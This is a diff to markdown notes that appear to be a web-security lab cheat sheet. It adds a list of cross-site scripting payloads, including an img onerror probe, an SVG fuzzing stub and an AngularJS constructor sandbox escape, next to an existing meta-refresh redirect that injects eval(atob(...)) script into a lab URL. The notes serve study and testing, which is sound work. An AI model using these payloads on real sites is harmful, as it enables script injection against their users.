@@ -68,6 +68,17 @@ With <b>`<meta>`</b> html tag we can redirect the "victim" to our javascript inj
 <meta http-equiv="refresh" content='0; URL=https://<LAB_URL>/?SearchTerm=aa","fd8xsw5l":eval(atob("BASE64-PAYLOAD"))}//' />
 ```
 
+### Different XSS Payloads
+```javascript
+${alert(1)}
+<svg><animatetransform%20§§=1>
+<><img src=1 onerror=alert(1)>
+\"-alert(1)}//
+
+//angular
+{{$on.constructor('alert(1)')()}}
+```
+
 ## SQL Injection Section
 
 ### PostgreSQL
